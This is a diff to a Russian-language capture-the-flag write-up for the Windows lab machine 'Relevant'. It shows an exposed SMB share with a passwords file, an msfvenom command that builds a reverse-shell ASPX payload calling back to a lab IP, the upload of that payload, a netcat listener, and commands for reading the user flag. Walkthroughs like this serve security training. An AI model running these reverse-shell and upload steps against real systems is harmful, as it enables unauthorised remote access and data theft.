@@ -25,3 +25,28 @@ Relevant — это машина на Windows, которая имитирует
 ![Решения](images/201.png)
 
 Подключившись, я обнаружил файл `passwords.txt` 
+Далее я создал файл `test.txt` и попробовал его загрузить, текст моего файла отображается, тоесть мы можем загрузить шелл.
+
+![Решения](images/202.png)
+
+Далее я создал и загрузил шелл:
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.112.118.150 LPORT=1234 -f aspx > payload.aspx`  
+`put payload.aspx`  
+
+![Решения](images/203.png)
+
+Дальше я буду подключатся через `netcat` и порт `1234`:
+
+![Решения](images/204.png)
+
+Далее я смог прочитать файл `user.txt` и найти первый флаг:
+
+`cd c:\users`  
+`dir`
+`cd Bob`  
+`dir`  
+`cd Desktop`  
+`dir`  
+`type user.txt`  
+
+![Решения](images/205.png) 
